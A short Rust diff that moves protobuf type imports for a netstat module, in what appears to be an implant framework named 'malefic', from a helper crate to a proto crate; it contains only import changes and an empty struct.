@@ -1,6 +1,7 @@
 use crate::{Module, Result, TaskResult, check_request};
-use malefic_helper::protobuf::implantpb::{spite::Body, NetstatResponse, SockTabEntry};
+use malefic_proto::proto::implantpb::{spite::Body};
 use async_trait::async_trait;
+use malefic_proto::proto::modulepb::{NetstatResponse, SockTabEntry};
 use malefic_trait::module_impl;
 
 pub struct Netstat {}
